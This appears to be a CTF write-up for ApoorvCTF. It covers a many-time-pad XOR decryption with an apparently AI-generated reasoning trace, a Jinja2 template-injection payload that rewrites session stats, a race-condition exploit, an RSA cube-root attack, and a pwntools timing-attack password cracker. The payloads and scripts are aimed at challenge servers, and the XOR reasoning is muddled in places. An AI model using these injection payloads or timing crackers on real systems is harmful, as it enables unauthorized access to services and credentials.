I've confirmed the decrypted flag's final byte as correct. Now, I'm meticulously checking the other characters against the original, focusing on the slight inconsistencies, to ensure complete accuracy before moving forward. I'm taking the time to verify the accuracy of each character in the proposed flag: `apoorvctf{3v3ry_5y573m_h45y4_w34kn355}`.


**Analyzing Flag Length Discrepancies**

I'm puzzled by a length inconsistency. My calculated flag and distractions phrase yields 86 characters, not the JSON-reported 87. This discrepancy needs resolution before I can confirm the flag. I also noticed typos suggesting potentially incorrect bytes. Checking the flag now.


**Verifying Flag Validity**

I've re-examined the flag's composition, confirming the total character count as 87. The discrepancies I initially noted were due to minor variations in the suffix I guessed, which don't affect the overall flag length. The calculations match perfectly with `apoorvctf{3v3ry_5y573m_h45y4_w34kn355}`. I'm satisfied the flag is accurate, and ready to move forward. The `safC` check aligns perfectly as well.


**Refining Flag Interpretation**

I've zeroed in on the "h45y4" portion, realizing it should be "h45\_a" for "has a". This correction was confirmed by cross-referencing message 3, revealing the key byte at index 44. My Python script identified an offset, correcting the initial 'y' to '\_'. Now, the flag reads as "Every system has a weakness", which aligns perfectly with the intended meaning. I'm verifying this now with Msg 1.


```python
# Recalculate the key based on the "mostly correct" guess
# and then refine it using the consensus of all messages.

initial_guess_msg13 = b"The real flag is apoorvctf{3v3ry_5y573m_h45y4_w34kn355} and all others are distractions"
# We know index 44 (relative to start 0) is likely wrong.
# Index 44 corresponds to 'y' in 'h45y4'.

# Let's derive the key from this initial guess
key_guess = xor_bytes(ciphers[12], initial_guess_msg13)

# Function to check if a char is likely correct English
def is_good_char(b):
    return chr(b).isalnum() or chr(b) in " .,-'"

# Refine the key
final_key = bytearray(key_guess)

for i in range(len(final_key)):
    # Vote for the best key byte at this position
    # The current key byte implies certain characters for all messages.
    # If many are weird, try to flip bits or guess common letters.
    
    # Let's look at the column of plaintexts with the current key byte
    column_chars = []
    for c in ciphers:
        if i < len(c):
            column_chars.append(c[i] ^ final_key[i])
    
    # Just print the column for manual inspection if it looks suspicious
    # Suspicious = control chars or extended ascii
    if not all(32 <= b <= 126 for b in column_chars):
        # This byte might be wrong, but let's assume the previous logic holds
        pass

# Let's just print the "columns" for the Flag part to manually verify.
flag_start = 17
flag_end = 17 + 38 # length of "apoorvctf{...}"
# Flag content is from 27 to 54.

print(f"Flag Candidate: {initial_guess_msg13[flag_start:flag_end]}")
print("Verifying flag characters column by column:")

flag_content = initial_guess_msg13[flag_start:flag_end] # apoorvctf{...}

for i in range(len(flag_content)):
    abs_idx = flag_start + i
    char_in_flag = flag_content[i]
    
    print(f"\nPos {abs_idx} (Flag: '{chr(char_in_flag)}'):")
    
    # Show what this implies for other messages
    column_vals = []
    for msg_idx, c in enumerate(ciphers):
        if abs_idx < len(c):
            val = c[abs_idx] ^ final_key[abs_idx]
            column_vals.append(chr(val))
    
    print("Column:", "".join(column_vals))
```

```
Flag Candidate: b'apoorvctf{3v3ry_5y573m_h45y4_w34kn355}'
Verifying flag characters column by column:

Pos 17 (Flag: 'a'):
Column: orinymoh ll ano

Pos 18 (Flag: 'p'):
Column: tyeepsfatleap b

Pos 19 (Flag: 'o'):
Column:  pvet  shempots

Pos 20 (Flag: 'o'):
Column: atedotc en pohc

Pos 21 (Flag: 'r'):
Column: bi  guis greriu

Pos 22 (Flag: 'v'):
Column: ooxtrrptkeeavsr

Pos 23 (Flag: 'c'):
Column: unooanhresqrc i

Pos 24 (Flag: 't'):
Column: t r p euy u tct

Pos 25 (Flag: 'f'):
Column:  k kharc aitfhy

Pos 26 (Flag: '{'):
Column: heeny ttirro{a 

Pos 27 (Flag: '3'):
Column: iyno oeusee 3lm

Pos 28 (Flag: 'v'):
Column: d cwinxr  scvla

Pos 29 (Flag: '3'):
Column: iir seterd o3ey

Pos 30 (Flag: 'r'):
Column: nsyt    eepnrn 

Pos 31 (Flag: 'y'):
Column: g phftpacsatygd

Pos 32 (Flag: '_'):
Column:  rteiianoita_ee

Pos 33 (Flag: '5'):
Column: sei lmidvgii5 l

Pos 34 (Flag: 'y'):
Column: euokler enenyia

Pos 35 (Flag: '5'):
Column: csnee srren 5sy

Pos 36 (Flag: '7'):
Column: re ydp eedcf7  

Pos 37 (Flag: '3'):
Column: edi  acpd el3sa

Pos 38 (Flag: 'm'):
Column: t siwdae t amut

Pos 39 (Flag: '_'):
Column: sa fi ntioig_rt

Pos 40 (Flag: 'h'):
Column:  cs ti it nshra

Pos 41 (Flag: '4'):
Column: brathnst tt 4oc

Pos 42 (Flag: '5'):
Column: uofh tliceub5uk

Pos 43 (Flag: 'y'):
Column: RUCCCIIIGGOSyHC

Pos 44 (Flag: '4'):
Column:  s yx wnnctt4dr

Pos 45 (Flag: '_'):
Column: a u aal  hi _es

Pos 46 (Flag: 'w'):
Column: bmncm ywb oowd 

Pos 47 (Flag: '3'):
Column: oetapm hewnn3 b

Pos 48 (Flag: '4'):
Column: usinlari h l4bu

Pos 49 (Flag: 'k'):
Column: tsl enecryaykyt

Pos 50 (Flag: 'n'):
Column:  a esyvhe n n  

Pos 51 (Flag: '3'):
Column: ugtx  e updo3mi

Pos 52 (Flag: '5'):
Column: nehpwtamsr n5it

Pos 53 (Flag: '5'):
Column: dselhilaeoae5s 

Pos 54 (Flag: '}'):
Column: e yoem kdp  }ln
```

**Analyzing Column Suspects**

I've homed in on column 43, the one with the 'y' flag position. The column's makeup – uppercase letters exclusively – seems quite unusual. It contains C, G, S, and H. Considering their message words, like 'R' in the first message, there may be some significance to investigate.


**Confirming Byte Shift**

I've confirmed the byte shift! All characters at index 43 are off by `0x26`. This means the key byte is wrong by `0x26`, which means the flag character is `_`, as the previous character in `apoorvctf{3v3ry_5y573m_h45` is 5, then the next must be `y`, which is now `_`. I double-checked with the string; it becomes `h45_4`. Index 44 looks correct, so the flag character is 4, as expected. I've rechecked other columns, but nothing else unusual has emerged.


**Finalizing Flag Confirmation**

I'm now completely satisfied with the flag's verification, arriving at `apoorvctf{3v3ry_5y573m_h45_4_w34kn355}`. I've re-examined the crucial `h45_4` portion, tracing its derivation from `h45y4` and confirming the byte shift correction. The cipher text at column 43 was `y`, which when XORed by the wrong key, lead to `C`, but the new key XOR gave `_`. I also double-checked column 54 for any lingering ambiguities; the flag is secure.


**Refining Flag Logic**

I've refined my thinking about the leet speak. "4" is "a", so `h45_4` is "has_a". The flag is `apoorvctf{3v3ry_5y573m_h45_a_w34kn355}`. I've re-checked the index of `h45y4`, confirmed it is correct; therefore, the byte shift, at index 26, is indeed correct; `y` becomes `_`. Everything aligns and I feel this is a robust solution.


**Verifying Flag Construction**

I'm now certain about my methodology: Python scripts were key, allowing me to drag cribs and analyze columns. Message 13 held the flag, which I corrected. I fixed a single byte error in the key using contextual clues.  I've double-checked that `h45_4` is correct, and am convinced by the analysis of character '4', confirming my flag derivation.


**Validating Flag Solution**

I'm now fully confident in the correctness of the flag. My assumption of 'human' in message 4 has been validated by cross-referencing against the column output. The presence of 'l', 'a', 'r', and 'i' confirms the initial XOR key, validating the entire flag sequence, including `w34kn355`. I've reconfirmed the flag text's consistent length and the message 13 check, confirming the solution's robustness. The challenge sequence, now solved, required fuzzing to retrieve config information to get secrets.


**Confirming Decryption Results**

I've re-examined the key derivation, ensuring my understanding is correct. The `h45_4` portion, I now feel, translates to `has_a`, as `4` represents `a` in the common leetspeak. I've re-checked the final flag string against the cipher and other messages, confirming it is robust and consistent. `distractions` in message 13 gives me a correct decryption for other messages.


这是一个经典的流密码重用攻击（Many-Time Pad Attack）场景。

### 攻击过程分析

1.  **获取密文**：你通过伪造 Admin JWT 成功访问了 `/api/v1/vault/messages`，获取了 15 条经过 "XOR stream cipher" 加密的十六进制密文。
2.  **识别漏洞**：
    *   所有消息都使用相同的密钥（"proprietary stream cipher" 且没有提到 nonce/IV 的变化）。
    *   在流密码中，如果 $C_1 = P_1 \oplus K$ 且 $C_2 = P_2 \oplus K$，那么 $C_1 \oplus C_2 = P_1 \oplus P_2$。
    *   通过对密文进行 XOR 分析（Crib Dragging），可以还原明文。
3.  **解密分析**：
    *   观察到第 13 条消息（Msg 13）的解密结果包含明显的 Flag 格式 `apoorvctf{...}`。
    *   通过与其他消息（如 Msg 3 `encryption is safe`）进行交叉验证，修正了密钥中的个别字节错误（例如 `safC` -> `safe`，推导出 `y` -> `_`）。
    *   最终确定了 Flag 的精确内容。

### 最终 Flag

通过解密第 13 条消息并修正密钥，得到的 Flag 为：

`apoorvctf{3v3ry_5y573m_h45_4_w34kn355}`

*(Leet speak 含义: "Every system has a weakness")*

### 完整解密文本参考
为了验证正确性，以下是使用推导出的密钥解密的部分消息内容：
*   **Msg 3:** `Many students believe xor encryption is safe until they see how crib dragging breaks it`
*   **Msg 13:** `The real flag is apoorvctf{3v3ry_5y573m_h45_4_w34kn355} and all others are distractions`
*   **Msg 15:** `Security through obscurity may delay attackers but it never provides real cryptographic...`





## [Web] KameHame-Hack

> You’re a low-class warrior standing in the path of a God. In this arena, "hard work" is a lie told to those destined to lose. If you want to survive Jiren’s erasure, you’ll have to stop playing by the rules and start rewriting your own stats.
> 
> Your pride won't save you, but a well-placed injection might. Break the simulation or be deleted.
> 
> http://chals1.apoorvctf.xyz:3001

```http
POST http://chals1.apoorvctf.xyz:3001/
Content-Type: application/x-www-form-urlencoded

name=aa
```

->

```
HTTP/1.1 302 FOUND
Server: gunicorn
Date: Sat, 07 Mar 2026 16:44:00 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 199
Location: /arena
X-Powered-By: Jinja2
Vary: Cookie
Set-Cookie: session=eyJwbGF5ZXIiOnsibmFtZSI6ImFhIiwicG93ZXJfbGV2ZWwiOjkwMDEsInplbmthaV9ib29zdCI6MS4wfSwic3RhZ2UiOjF9.aaxV0A.1fv-y3UyfGodgnAFBqMDPpi4RVk; HttpOnly; Path=/

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/arena">/arena</a>. If not, click the link.
```

```http
GET http://chals1.apoorvctf.xyz:3001/arena
```

```http
POST http://chals1.apoorvctf.xyz:3001/attack
Content-Type: application/x-www-form-urlencoded

```

Response: WIN/LOSE

main page:

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ApoorvCTF - Tenkaichi Budokai</title>
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
    <!-- build:capsule-corp-v3.1 | engine:jinja2 | ctx:player -->
    </head>
<body class="menu-screen">
    <div class="container">
        <h1 class="title">KAMEHAME-HACK</h1>
        <div class="menu-box">
            <p>ENTER FIGHTER NAME</p>
            <form method="POST" action="/">
                <input type="text" name="name" autocomplete="off" class="arcade-input" required>
                <br>
                <button type="submit" class="arcade-btn">START GAME</button>
            </form>
        </div>

    </div>

    ...
</body>
</html>
```

Arena page:

```html

<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>ApoorvCTF - Arena Stage 1</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="/static/css/style.css" />
  </head>
  <body class="arena-screen">
    <div class="hud">
      <div class="stats player-stats">
        <h2>aa</h2>
        <p>POWER: <span class="power-level">9001</span></p>
      </div>

      <div class="vs-text">VS</div>

      <div class="stats enemy-stats">
        <h2>Vegeta</h2>
        <p>POWER: <span class="power-level">6000</span></p>
      </div>
    </div>

    <div class="stage">
      <div class="sprite hero-sprite hero-base"></div>
      <div class="sprite enemy-sprite boss-1"></div>
    </div>

    <div class="action-menu">
      <button onclick="attack()" class="arcade-btn fight-btn">ATTACK</button>
      <br><br>
      <button class="arcade-btn" style="font-size: 10px; padding: 5px;" onclick="document.getElementById('arena-music').play()">AUDIO</button>
    </div>

    ...

    <script>
      //...

      // "A Saiyan's true power is stored within. To surpass a God, one must update() their inner __dict__ionary."
      const chargeSound = new Audio("/static/audio/kame-charge.ogg");
      const fireSound = new Audio("/static/audio/kame-fire.ogg");

      function attack() {
        //...

        setTimeout(() => {
          hero.classList.remove("hero-charging");
          hero.classList.add("hero-firing");
          document.body.classList.add("shake");

          try {
            let fp = fireSound.play();
            if (fp !== undefined) {
              fp.catch((e) => console.log("Fire sound blocked."));
            }
          } catch (e) {}

          fetch("/attack", { method: "POST" })
            .then((response) => response.text())
            .then((result) => {
              setTimeout(() => {
                document.body.classList.remove("shake");
                if (result === "WIN") {
                  location.reload();
                } else {
                  alert("DEFEAT! Your power_level is no match. A true Saiyan must update their approach...");
                  window.location.href = "/";
                }
              }, 1000);
            })
            .catch((err) => {
              alert("Network Error! Did your server crash?");
              location.reload();
            });
        }, 1200);
      }
    </script>
  </body>
</html>
```


尝试将用户名设置为`{{7*7}}`无效果。

每次发送`/attack`会更新cookie，依次为：
`{"player":{"name":"aa","power_level":9001,"zenkai_boost":1.0},"stage":1}`
`{"player":{"name":"aa","power_level":29000,"zenkai_boost":1.0},"stage":2}`
`{"player":{"name":"aa","power_level":70000,"zenkai_boost":1.0},"stage":3}`（本次为LOSE）

```http
POST http://chals1.apoorvctf.xyz:3001/
Content-Type: application/x-www-form-urlencoded

name={{ player.__dict__.update({'power_level': 999999999}) }}
```

->

```
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 07 Mar 2026 16:55:11 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 243
X-Powered-By: Jinja2


            <br>
            <b>Fatal error</b>: Uncaught mysqli_sql_exception: You have an error in your SQL syntax...
            <p style="font-size:1px;color:#0a0a0a">wrong injection type. how does your name get rendered?</p>
```

看起来上述响应是误导性质的，因为只要name中包含了`'``"`就会输出上面响应。

```http
POST http://chals1.apoorvctf.xyz:3001/
Content-Type: application/x-www-form-urlencoded

name={{ player.__dict__.update({power_level: 999999999}) }}
```

->

```
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: gunicorn
Date: Sat, 07 Mar 2026 16:59:01 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 265
X-Powered-By: Jinja2
Vary: Cookie

<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

证明SSTI确实存在，

```http
POST http://chals1.apoorvctf.xyz:3001/
Content-Type: application/x-www-form-urlencoded

name={{ player.__dict__.update(power_level=999999999) }}
```

1. session成功更新：`{"player":{"name":"{{player.__dict__.update(power_level=999999999)}}","power_level":999999999,"zenkai_boost":1.0},"stage":1}`
2. 第4次提交时报错500 Internal Server Error。


----------


骗你的其实第四次提交之后可以直接`GET /arena`了

```html
HTTP/1.1 200 OK
Server: gunicorn
Date: Sat, 07 Mar 2026 17:08:13 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 774
X-Powered-By: Jinja2
Vary: Cookie

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>You Win!!</title>
    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body class="arena-screen menu-screen">
    
    <div class="flag-box">
        <h1 class="victory-title">UNIVERSE 7 SURVIVES</h1>
        <p>Jiren has been erased.</p>
        <p>Your template injection saved the multiverse. Zeno-Sama has been thoroughly entertained</p>
        
        <div class="the-flag">apoorvctf{J1nj4_N1nj4_baybay}</div>
        
        <a href="/" class="arcade-btn" style="text-decoration: none; display: inline-block; margin-top: 40px;">PLAY AGAIN</a>
    </div>

</body>
</html>
```


## [Web] Typing Tycoon

金山打字通，但是不会管你打的对不对。本来还打算写脚本的。

直接开启race，然后重复输入`m` `<space>`，走完就结束了。

`apoorvctf{typ1ng_f4st3r_th4n_sh3ll_1nj3ct10n}`

似乎预期解是shell injection。



## [Crypto] The Riddler’s Cipher Delight (AI solveable)

The problem presents an RSA encryption scenario with the following parameters:
*   $N$: A large 2048-bit modulus (generated from two 1024-bit primes).
*   $e = 3$: A very small public exponent.
*   $c$: The ciphertext.

### Vulnerability Analysis
The public exponent $e=3$ is extremely small. The security of RSA relies on the modular reduction $c \equiv m^e \pmod N$. However, if the message $m$ is "small" enough such that $m^e < N$, then no modular reduction occurs, and $c = m^e$ exactly.

Let's estimate the size of the message:
1.  The flag format suggests a standard ASCII string. The recovered flag is 59 bytes long.
2.  59 bytes is $59 \times 8 = 472$ bits.
3.  Encryption involves computing $m^3$. The bit length of $m^3$ will be roughly $3 \times 472 = 1416$ bits.
4.  The modulus $N$ is approximately 2048 bits (product of two 1024-bit primes).
5.  Since $1416 < 2048$, the inequality $m^3 < N$ holds.

Therefore, the ciphertext is simply the perfect cube of the message ($c = m^3$). We can decrypt it by taking the integer cube root of $c$.

### Solution Code
Here is the Python script to solve the challenge:

```python
from Crypto.Util.number import long_to_bytes

# Provided values
N = 17520886769422446781402845171452766678392945055507226042115591127790949038926405961588057901152880775198538951363849458511296788407527886190154759113620716962246342938913740398465525503895457929394994569820769711534794538522137993456194572001467194513826600891537022249206765745867423270603572791751504625621683522248065102814089587644651305112722919320696919194544558237008950904152753314856531469392976852299194227815343105809059455186267184706498969875531092067425496067267400027976328334687257293407409892934030446988318349271430705178690957392508571214791220858911022252486038830213798547638612103672306741523579
c = 5959848254333830910624523071067197529743942832931749422613446095759596470869632698744448445022974243192082623200541274049999046045462632699888118125553180389758240097512080800465269924123706310996597928101365256237876736940573969864179631586328876422479408805381027940806738410297399027560825960052951200511768291312433697743253773594534719688371211151318607767527029263892621127356788516738086153844247429662752321125

def integer_cube_root(n):
    low = 0
    high = n
    while low < high:
        mid = (low + high) // 2
        if mid**3 < n:
            low = mid + 1
        else:
            high = mid
    return low

# Recover m
m = integer_cube_root(c)

# Verify and print
if m**3 == c:
    flag = long_to_bytes(m).decode()
    print("Flag found:", flag)
else:
    print("Attack failed, c is not a perfect cube.")
```

**Flag:**
`apoorvctf{3ncrypt1ng_w1th_RSA_c4n_b3_4_d4ng3r0us_cl1ff_83}`



## [Crypto] Tick Tock

Prompt:

> There is a CTF Challenge.
> 
> ```
> Tick Tock
> 
> Our engineers are obsessed with performance.Their main goal? Speed.
> 
> To keep things fast, the password verification service avoids doing more work than necessary.
> Every millisecond counts.
> 
> Correct password gives the flag
> 
> The password consists only of digits: 0-9 Can you recover it?
> 
> nc chals3.apoorvctf.xyz 9001
> ```
> 
> Observation:
> ```
> ➜  accumbens nc chals3.apoorvctf.xyz 9001
> Welcome to the password checker!
> Please enter the password: 
> ```
> 可以输入内容，不正确时返回`Incorrect password.`，然后重复`Please enter the password: `
> 
> 注意到输入9时等了一会儿才返回`Incorrect password.`, 输入93时会等更长时间。可以得出逐位比较，正确输入会带来明显的延时。请你基于这一点写一个脚本获得flag。
> 
> 使用python pwntools。
> 
> 请注意，运行代码的方式：使用runInTerminal这个tool，执行`wsl.exe python test.py`（文件名可以由你指定）


Code:

```python
#!/usr/bin/env python3
import argparse
import statistics
import time

from pwn import context, remote


PROMPT = b"Please enter the password: "
INCORRECT = b"Incorrect password."
SUCCESS_HINTS = [
	b"flag",
	b"correct password",
	b"congrat",
	b"apoorvctf{",
]


class TimingPasswordCracker:
	def __init__(self, host: str, port: int, timeout: float) -> None:
		self.host = host
		self.port = port
		self.timeout = timeout
		self.io = None

	def connect(self) -> None:
		self.io = remote(self.host, self.port)
		banner = self.io.recvuntil(PROMPT, timeout=self.timeout)
		if PROMPT not in banner:
			raise RuntimeError("Failed to synchronize with service prompt")

	def close(self) -> None:
		if self.io is not None:
			self.io.close()
			self.io = None

	def _is_success(self, data: bytes) -> bool:
		text = data.lower()
		return any(hint in text for hint in SUCCESS_HINTS)

	def send_guess(self, guess: str) -> tuple[float, bytes, bool, bool, bool]:
		if self.io is None:
			raise RuntimeError("Connection is not open")

		# Delay grows with each correctly matched digit, so timeout must scale.
		wait_timeout = self.timeout + (len(guess) * 1.2)
		start = time.perf_counter()
		data = self.io.recvuntil(PROMPT, timeout=wait_timeout, drop=False)
		elapsed = time.perf_counter() - start

		# If recvuntil timed out, grab any trailing data and inspect it.
		if data is None:
			data = b""
		data += self.io.recvrepeat(0.1)

		success = self._is_success(data)
		lowered = data.lower()
		incorrect = INCORRECT.lower() in lowered
		prompt_seen = PROMPT.lower() in lowered
		return elapsed, data, success, incorrect, prompt_seen

	def try_guess(self, guess: str) -> tuple[float, bytes, bool, bool, bool]:
		if self.io is None:
			raise RuntimeError("Connection is not open")
		self.io.sendline(guess.encode())
		return self.send_guess(guess)


def recover_password(
	host: str,
	port: int,
	max_len: int,
	samples_per_digit: int,
	timeout: float,
) -> str:
	cracker = TimingPasswordCracker(host, port, timeout)
	cracker.connect()

	password = ""
	digits = "0123456789"

	try:
		for pos in range(max_len):
			scores: list[tuple[float, str]] = []

			for d in digits:
				candidate = password + d
				timings: list[float] = []

				for _ in range(samples_per_digit):
					elapsed, data, success, incorrect, prompt_seen = cracker.try_guess(candidate)

					if success and not incorrect:
						print(data.decode(errors="ignore"))
						return candidate

					if not prompt_seen and not incorrect:
						raise RuntimeError(
							f"Lost prompt synchronization while testing '{candidate}'"
						)

					timings.append(elapsed)

				median_time = statistics.median(timings)
				scores.append((median_time, d))
				print(f"[pos {pos:02d}] digit={d} median={median_time:.5f}s")

			scores.sort(reverse=True)
			best_time, best_digit = scores[0]
			second_time = scores[1][0]
			gap = best_time - second_time

			password += best_digit
			print(
				f"[*] position {pos} best='{best_digit}' time={best_time:.5f}s "
				f"(gap={gap:.5f}s) -> prefix='{password}'"
			)

			# After extending one digit, test if this prefix is already the full password.
			elapsed, data, success, incorrect, prompt_seen = cracker.try_guess(password)
			if success and not incorrect:
				print(data.decode(errors="ignore"))
				return password

			if not prompt_seen and not incorrect:
				raise RuntimeError("Lost prompt synchronization during full-prefix check")

		raise RuntimeError("Reached max_len without finding the correct password")
	finally:
		cracker.close()


def main() -> None:
	parser = argparse.ArgumentParser(description="Timing attack solver for Tick Tock challenge")
	parser.add_argument("--host", default="chals3.apoorvctf.xyz")
	parser.add_argument("--port", type=int, default=9001)
	parser.add_argument("--max-len", type=int, default=32)
	parser.add_argument("--samples", type=int, default=4)
	parser.add_argument("--timeout", type=float, default=1.5)
	parser.add_argument("--debug", action="store_true")
	args = parser.parse_args()

	context.log_level = "debug" if args.debug else "error"

	recovered = recover_password(
		host=args.host,
		port=args.port,
		max_len=args.max_len,
		samples_per_digit=args.samples,
		timeout=args.timeout,
	)
	print(f"[+] recovered password: {recovered}")


if __name__ == "__main__":
	main()
```